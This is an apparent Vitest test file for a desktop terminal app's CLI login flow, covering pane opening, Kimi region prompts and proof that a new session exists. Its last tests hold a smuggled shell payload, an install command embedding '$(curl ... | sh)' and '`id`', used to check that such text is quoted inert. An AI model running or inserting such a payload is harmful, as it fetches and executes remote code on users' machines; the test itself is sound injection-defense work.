/** @vitest-environment jsdom */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const layout = vi.hoisted(() => ({
  addShellPane: vi.fn(() => 'pane-login'),
  focus: vi.fn(),
  close: vi.fn(),
  renameTitle: vi.fn(),
  root: null,
}));

/** O pane de login some da árvore quando o operador o fecha. */
const panes = vi.hoisted(() => ({ open: [{ id: 'pane-login' }] }));

const navigation = vi.hoisted(() => ({
  openTerminal: vi.fn(),
}));

const host = vi.hoisted(() => ({
  waitForSession: vi.fn(async (_paneId: string): Promise<string | null> => 'session-login'),
  writeToPane: vi.fn(),
}));

vi.mock('../../state/layout-store', () => ({
  useLayoutStore: Object.assign(
    () => layout,
    { getState: () => layout, subscribe: () => () => undefined },
  ),
}));

vi.mock('../../state/product-navigation-store', () => ({
  useProductNavigationStore: Object.assign(
    () => navigation,
    { getState: () => navigation },
  ),
}));

vi.mock('../../terminal/terminal-host', () => ({
  waitForSession: (paneId: string) => host.waitForSession(paneId),
  writeToPane: (paneId: string, text: string) => host.writeToPane(paneId, text),
}));

/** Catálogo de providers: mutável para o teste da mensagem de CLI ausente. */
const providerState = vi.hoisted(() => ({
  providers: [] as Array<Record<string, unknown>>,
}));

vi.mock('../../state/provider-store', () => ({
  useProviderStore: Object.assign(
    () => providerState,
    {
      getState: () => providerState,
      subscribe: () => () => undefined,
    },
  ),
}));

vi.mock('../../state/session-state-store', () => ({
  useSessionStateStore: Object.assign(
    () => ({ paneStates: new Map() }),
    {
      getState: () => ({ paneStates: new Map() }),
      subscribe: () => () => undefined,
    },
  ),
}));

vi.mock('../../lib/split-tree', () => ({
  listPanes: () => panes.open,
}));

const kimiAsk = vi.hoisted(() => ({
  askKimiLoginRegion: vi.fn(
    async (): Promise<'global' | 'mainland-cn' | null> => 'global',
  ),
}));
vi.mock('./kimi-login-region', () => kimiAsk);

import {
  cliLoginProvedNewSession,
  cliLoginTypeLine,
  openCliLoginTerminal,
  type CliLoginFinish,
} from './cli-login-terminal';

describe('openCliLoginTerminal', () => {
  beforeEach(() => {
    layout.addShellPane.mockClear().mockReturnValue('pane-login');
    layout.focus.mockClear();
    layout.close.mockClear();
    layout.renameTitle.mockClear();
    navigation.openTerminal.mockClear();
    host.waitForSession.mockClear().mockResolvedValue('session-login');
    host.writeToPane.mockClear();
    panes.open = [{ id: 'pane-login' }];
    providerState.providers = [];
    kimiAsk.askKimiLoginRegion.mockReset().mockResolvedValue('global');
  });

  it('espera a sessão e só então sai de Configurações (F-003)', async () => {
    const order: string[] = [];
    navigation.openTerminal.mockImplementation(() => order.push('openTerminal'));
    layout.addShellPane.mockImplementation(() => {
      order.push('addShellPane');
      return 'pane-login';
    });
    host.waitForSession.mockImplementation(async () => {
      order.push('waitForSession');
      return 'session-login';
    });

    const result = await openCliLoginTerminal({
      command: 'claude auth login',
      adapterId: 'claude',
      adapterLabel: 'Claude',
    });

    expect(result).toEqual({ ok: true, paneId: 'pane-login' });
    expect(order).toEqual(['addShellPane', 'waitForSession', 'openTerminal']);
    expect(layout.addShellPane).toHaveBeenCalledWith({ focus: false });
    expect(layout.renameTitle).toHaveBeenCalledWith('pane-login', 'Login Claude');
    expect(host.writeToPane).toHaveBeenCalledWith(
      'pane-login',
      'claude auth login\n',
    );
    expect(layout.focus).toHaveBeenCalledWith('pane-login');
    expect(layout.close).not.toHaveBeenCalled();
  });

  it('fica em Configurações e anuncia se a sessão não nascer', async () => {
    host.waitForSession.mockResolvedValueOnce(null);
    const result = await openCliLoginTerminal({
      command: 'claude auth login',
    });
    expect(result.ok).toBe(false);
    if (result.ok) throw new Error('expected failure');
    expect(result.error).toMatch(/login não foi iniciado/i);
    expect(layout.close).toHaveBeenCalledWith(
      'pane-login',
      'cli-login-terminal-unavailable',
    );
    expect(navigation.openTerminal).not.toHaveBeenCalled();
  });

  it('comando que não pode ser digitado fecha o pane e devolve erro (F-355)', async () => {
    host.writeToPane.mockImplementationOnce(() => {
      throw new Error('process is not defined');
    });
    const result = await openCliLoginTerminal({
      command: 'muse login',
      adapterId: 'muse',
    });
    expect(result.ok).toBe(false);
    if (result.ok) throw new Error('expected failure');
    expect(result.error).toMatch(/comando de login/i);
    expect(layout.close).toHaveBeenCalledWith(
      'pane-login',
      'cli-login-write-failed',
    );
    expect(navigation.openTerminal).not.toHaveBeenCalled();
  });
});

describe('cliLoginTypeLine — F-354', () => {
  it('Kimi no POSIX substitui o shell pela CLI de login', () => {
    expect(
      cliLoginTypeLine({
        command: 'kimi login --region global',
        adapterId: 'kimi',
        platform: 'darwin',
      }),
    ).toBe('exec kimi login --region global\n');
  });

  it('outras CLIs e Windows ficam no shell', () => {
    expect(
      cliLoginTypeLine({
        command: 'claude auth login',
        adapterId: 'claude',
        platform: 'darwin',
      }),
    ).toBe('claude auth login\n');
    expect(
      cliLoginTypeLine({
        command: 'kimi login --region global',
        adapterId: 'kimi',
        platform: 'win32',
      }),
    ).toBe('kimi login --region global\n');
  });

  /**
   * F-355: o renderer é sandboxed — `process` não existe na página e
   * `process.platform` derrubava todo login de CLI. Sem `platform` explícita a
   * fonte é `window.nexus.platform` (preload), não o `process` do host.
   */
  it('sem platform explícita, a ponte window.nexus.platform decide (F-355)', () => {
    Object.defineProperty(window, 'nexus', {
      configurable: true,
      value: { platform: 'win32' },
    });
    try {
      expect(
        cliLoginTypeLine({
          command: 'kimi login --region global',
          adapterId: 'kimi',
        }),
      ).toBe('kimi login --region global\n');
    } finally {
      Reflect.deleteProperty(window, 'nexus');
    }
    Object.defineProperty(window, 'nexus', {
      configurable: true,
      value: { platform: 'darwin' },
    });
    try {
      expect(
        cliLoginTypeLine({
          command: 'kimi login --region global',
          adapterId: 'kimi',
        }),
      ).toBe('exec kimi login --region global\n');
    } finally {
      Reflect.deleteProperty(window, 'nexus');
    }
  });
});

describe('openCliLoginTerminal — Kimi pergunta o site (F-354)', () => {
  it('pergunta a região e abre a CLI com exec, não um shell cru', async () => {
    kimiAsk.askKimiLoginRegion.mockResolvedValueOnce('mainland-cn');
    const result = await openCliLoginTerminal({
      command: 'kimi login --region global',
      adapterId: 'kimi',
      adapterLabel: 'Kimi',
    });
    expect(result).toEqual({ ok: true, paneId: 'pane-login' });
    expect(kimiAsk.askKimiLoginRegion).toHaveBeenCalledOnce();
    expect(host.writeToPane).toHaveBeenCalledWith(
      'pane-login',
      cliLoginTypeLine({
        command: 'kimi login --region mainland-cn',
        adapterId: 'kimi',
      }),
    );
  });

  it('cancelar a escolha não abre pane nenhum', async () => {
    kimiAsk.askKimiLoginRegion.mockResolvedValueOnce(null);
    const result = await openCliLoginTerminal({
      command: 'kimi login --region global',
      adapterId: 'kimi',
    });
    expect(result).toEqual({
      ok: false,
      error: 'Login cancelado.',
      cancelled: true,
    });
    expect(layout.addShellPane).not.toHaveBeenCalled();
    expect(host.writeToPane).not.toHaveBeenCalled();
  });

  it('outras CLIs não perguntam região', async () => {
    await openCliLoginTerminal({
      command: 'claude auth login',
      adapterId: 'claude',
    });
    expect(kimiAsk.askKimiLoginRegion).not.toHaveBeenCalled();
    expect(host.writeToPane).toHaveBeenCalledWith(
      'pane-login',
      'claude auth login\n',
    );
  });
});

describe('cliLoginProvedNewSession — o que autoriza gravar uma conta nova', () => {
  const ok = (extra: Record<string, unknown> = {}) => ({
    adapterId: 'codex',
    state: 'ok' as const,
    detail: 'sessão viva',
    ...extra,
  });

  it('sonda ainda sem sessão nunca prova login', () => {
    expect(
      cliLoginProvedNewSession(
        { adapterId: 'codex', state: 'missing', detail: 'precisa login' },
        { adapterId: 'codex', state: 'missing', detail: 'precisa login' },
      ),
    ).toBe(false);
    // Sonda muda, mas sem prova de sessão nenhuma.
    expect(cliLoginProvedNewSession(ok(), null)).toBe(false);
  });

  it('não havia sessão e agora há: primeiro login provado', () => {
    expect(
      cliLoginProvedNewSession(
        { adapterId: 'codex', state: 'missing', detail: 'precisa login' },
        ok(),
      ),
    ).toBe(true);
    expect(cliLoginProvedNewSession(null, ok())).toBe(true);
  });

  it('CLI que JÁ estava logada só prova com a sessão trocando', () => {
    // Cancelou o login: mesma sessão dos dois lados.
    expect(
      cliLoginProvedNewSession(
        ok({ sessionFingerprint: 'aaa' }),
        ok({ sessionFingerprint: 'aaa' }),
      ),
    ).toBe(false);
    // Entrou na conta B: fingerprint diferente.
    expect(
      cliLoginProvedNewSession(
        ok({ sessionFingerprint: 'aaa' }),
        ok({ sessionFingerprint: 'bbb' }),
      ),
    ).toBe(true);
    // Reautenticou a MESMA conta: o blob rodou, o fingerprint mudou.
    expect(
      cliLoginProvedNewSession(
        ok({ sessionFingerprint: 'velho', detail: 'sessão viva: dev@example.com' }),
        ok({ sessionFingerprint: 'novo', detail: 'sessão viva: dev@example.com' }),
      ),
    ).toBe(true);
  });

  it('sem fingerprint, o e-mail da sonda ainda distingue A de B', () => {
    expect(
      cliLoginProvedNewSession(
        ok({ detail: 'sessão viva: a@example.com' }),
        ok({ detail: 'sessão viva: b@example.com' }),
      ),
    ).toBe(true);
    expect(
      cliLoginProvedNewSession(
        ok({ detail: 'sessão viva: a@example.com' }),
        ok({ detail: 'sessão viva: A@Example.com' }),
      ),
    ).toBe(false);
  });

  it('CLI sem identidade nenhuma não vira conta nova por adivinhação', () => {
    expect(
      cliLoginProvedNewSession(
        ok({ detail: 'sessão viva' }),
        ok({ detail: 'sessão viva' }),
      ),
    ).toBe(false);
  });

  it('fingerprint vence o e-mail: dois workspaces com o mesmo e-mail são contas diferentes', () => {
    expect(
      cliLoginProvedNewSession(
        ok({ sessionFingerprint: 'ws-1', detail: 'sessão viva: dev@example.com' }),
        ok({ sessionFingerprint: 'ws-2', detail: 'sessão viva: dev@example.com' }),
      ),
    ).toBe(true);
  });
});

/**
 * O watcher inteiro, com o pane de login já fechado: o único caminho que
 * resta é a sonda. É onde "fechei o terminal" tem de PARAR de virar sucesso.
 */
describe('openCliLoginTerminal — o que o watcher entrega ao fechar', () => {
  const baseline = {
    adapterId: 'codex',
    state: 'ok' as const,
    detail: 'sessão viva',
    sessionFingerprint: 'antes',
  };

  function stubProbe(status: Record<string, unknown> | null): void {
    Object.defineProperty(window, 'nexus', {
      configurable: true,
      value: {
        providers: { authStatus: vi.fn(async () => (status ? [status] : [])) },
        pty: { onData: vi.fn(() => () => undefined) },
      },
    });
  }

  beforeEach(() => {
    layout.addShellPane.mockClear().mockReturnValue('pane-login');
    host.waitForSession.mockClear().mockResolvedValue('session-login');
    // Pane fechado antes de o watcher olhar pela primeira vez.
    panes.open = [];
  });

  afterEach(() => {
    Reflect.deleteProperty(window, 'nexus');
  });


  it('fechar o terminal sem trocar de sessão NÃO é login novo', async () => {
    stubProbe({ ...baseline });
    const finished: CliLoginFinish[] = [];
    await openCliLoginTerminal({
      command: 'codex login',
      adapterId: 'codex',
      baseline,
      onFinished: (finish) => finished.push(finish),
    });
    await vi.waitFor(() => expect(finished).toHaveLength(1));
    expect(finished[0]!.verified).toBe(false);
  });

  it('fechar o terminal DEPOIS de entrar na conta B é login novo', async () => {
    stubProbe({ ...baseline, sessionFingerprint: 'depois' });
    const finished: CliLoginFinish[] = [];
    await openCliLoginTerminal({
      command: 'codex login',
      adapterId: 'codex',
      baseline,
      onFinished: (finish) => finished.push(finish),
    });
    await vi.waitFor(() => expect(finished).toHaveLength(1));
    expect(finished[0]!.verified).toBe(true);
    expect(finished[0]!.status?.sessionFingerprint).toBe('depois');
  });

  it('sonda indisponível ao fechar não inventa sucesso', async () => {
    stubProbe(null);
    const finished: CliLoginFinish[] = [];
    await openCliLoginTerminal({
      command: 'codex login',
      adapterId: 'codex',
      baseline,
      onFinished: (finish) => finished.push(finish),
    });
    await vi.waitFor(() => expect(finished).toHaveLength(1));
    expect(finished[0]!.verified).toBe(false);
  });

  it.each([
    { reauthenticate: true, success: false, revision: 'new' },
    { reauthenticate: false, success: true, revision: 'new' },
    { reauthenticate: true, success: true, revision: 'old' },
  ])('does not prove same-account login without all evidence: %j', async ({ reauthenticate, success, revision }) => {
    panes.open = [{ id: 'pane-login' }];
    const before = { ...baseline, sessionRevision: 'old' };
    let onData: ((chunk: string) => void) | undefined;
    Object.defineProperty(window, 'nexus', { configurable: true, value: {
      providers: { authStatus: vi.fn(async () => [{ ...before, sessionRevision: revision }]) },
      pty: { onData: (_id: string, cb: (text: string) => void) => { onData = cb; return () => undefined; } },
    } });
    const finished: CliLoginFinish[] = [];
    await openCliLoginTerminal({ command: 'codex login', adapterId: 'codex', baseline: before,
      reauthenticate, onFinished: (finish) => finished.push(finish) });
    panes.open = [];
    onData?.(success ? 'Signed in as user@example.com\n' : 'shell prompt\n');
    await vi.waitFor(() => expect(finished).toHaveLength(1));
    expect(finished[0]!.verified).toBe(false);
  });

  it('accepts same-account renewal only after explicit login success and changed credentials', async () => {
    panes.open = [{ id: 'pane-login' }];
    const before = { ...baseline, sessionRevision: 'old' };
    let current = { ...before };
    let onData: ((chunk: string) => void) | undefined;
    Object.defineProperty(window, 'nexus', { configurable: true, value: {
      providers: { authStatus: vi.fn(async () => [current]) },
      pty: { onData: (_id: string, cb: (text: string) => void) => { onData = cb; return () => undefined; } },
    } });
    const finished: CliLoginFinish[] = [];
    await openCliLoginTerminal({ command: 'codex login', adapterId: 'codex', baseline: before,
      reauthenticate: true, onFinished: (finish) => finished.push(finish) });
    await Promise.resolve();
    current = { ...before, sessionRevision: 'new' };
    onData?.('background output\n');
    await Promise.resolve();
    expect(finished).toHaveLength(0);
    onData?.('Signed in as user@example.com\n');
    await vi.waitFor(() => expect(finished).toHaveLength(1));
    expect(finished[0]!.verified).toBe(true);
  });

  it('linha Signed in não encerra antes de a credencial nova ficar visível', async () => {
    panes.open = [{ id: 'pane-login' }];
    let current = { ...baseline };
    let onData: ((chunk: string) => void) | undefined;
    Object.defineProperty(window, 'nexus', {
      configurable: true,
      value: {
        providers: {
          authStatus: vi.fn(async () => [current]),
        },
        pty: {
          onData: vi.fn(
            (_sessionId: string, listener: (chunk: string) => void) => {
              onData = listener;
              return () => undefined;
            },
          ),
        },
      },
    });
    const finished: CliLoginFinish[] = [];
    await openCliLoginTerminal({
      command: 'codex login',
      adapterId: 'codex',
      baseline,
      onFinished: (finish) => finished.push(finish),
    });

    // A CLI imprime sucesso antes de o auth.json/Keychain ficar visível para
    // outra leitura. O watcher antigo soltava `verified:false` aqui e nunca
    // tentava de novo.
    onData?.('Signed in as user@example.com\n');
    await Promise.resolve();
    await Promise.resolve();
    expect(finished).toHaveLength(0);

    current = { ...baseline, sessionFingerprint: 'depois' };
    onData?.('shell prompt\n');
    await vi.waitFor(() => expect(finished).toHaveLength(1));
    expect(finished[0]).toMatchObject({
      verified: true,
      status: { sessionFingerprint: 'depois' },
    });
  });
});

/**
 * O aviso de "CLI não encontrada" é TEXTO, não instrução: ele só pode aparecer
 * na tela. `provider.label` e `installCommand` são dados do catálogo, e o que
 * chega ao pane é um shell de verdade — então nada que venha dali pode ser
 * interpretado.
 */
describe('openCliLoginTerminal — o aviso de CLI ausente não executa o próprio texto', () => {
  /** O que o shell realmente veria: só o que está FORA de aspas simples. */
  function outsideSingleQuotes(text: string): string {
    return text.replace(/'[^']*'/g, '');
  }

  it('comando sugerido com substituição de shell sai citado, não executável', async () => {
    providerState.providers = [
      {
        adapterId: 'evil',
        label: 'Evil',
        installed: false,
        installCommand: 'npm i -g evil $(curl -s https://x.test/p | sh) `id`',
      },
    ];

    await openCliLoginTerminal({ command: 'evil login', adapterId: 'evil' });

    const written = host.writeToPane.mock.calls[0]?.[1] as string;
    expect(written).toBeDefined();
    // Fora das aspas não sobra `$` nem crase: nenhuma substituição roda.
    expect(outsideSingleQuotes(written)).not.toMatch(/[$`]/);
    // E o texto continua legível para quem lê, só que inerte: as aspas que o
    // cercam são o que a asserção acima já provou.
    expect(written).toContain('npm i -g evil $(curl -s https://x.test/p | sh) `id`');
  });

  it('aspas simples no rótulo não escapam do literal', async () => {
    providerState.providers = [
      {
        adapterId: 'quoted',
        label: "It's $(id)",
        installed: false,
        installCommand: 'echo ok',
      },
    ];

    await openCliLoginTerminal({ command: 'quoted login', adapterId: 'quoted' });

    const written = host.writeToPane.mock.calls[0]?.[1] as string;
    expect(outsideSingleQuotes(written)).not.toMatch(/[$`]/);
  });
});
